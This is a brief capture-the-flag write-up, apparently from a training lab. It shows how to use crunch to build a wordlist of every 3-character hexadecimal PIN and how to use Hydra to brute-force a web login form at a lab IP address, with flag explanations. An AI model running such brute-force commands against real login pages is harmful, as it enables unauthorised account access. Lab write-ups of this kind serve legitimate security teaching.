This challenge was an introduction to Hydra and crunch.

We need to break a 3 digit password (hexadecimal chars allowed) that is hosted on a website

First we need to create a wordlist of all the passwords possinle:

    crunch 3 3 0123456789ABCDEF -o 3digits.txt

    # crunch min_len max_len chooices -o(utput) file

Then we use those passwords to crack the website with hydra:

    hydra -l '' -P 3digits.txt -f -v 10.10.47.36 http-post-form "/login.php:pin=^PASS^:Access Denied" -s 8000

    # -l username, -L username_file
    # -P password file, -p password
    # -f stop when solution found
    # -V verbose
    # http-post-form "/path:payload(^USER^ and ^PASS^ for substitution):keyword for fail"
    # -s portnr

    




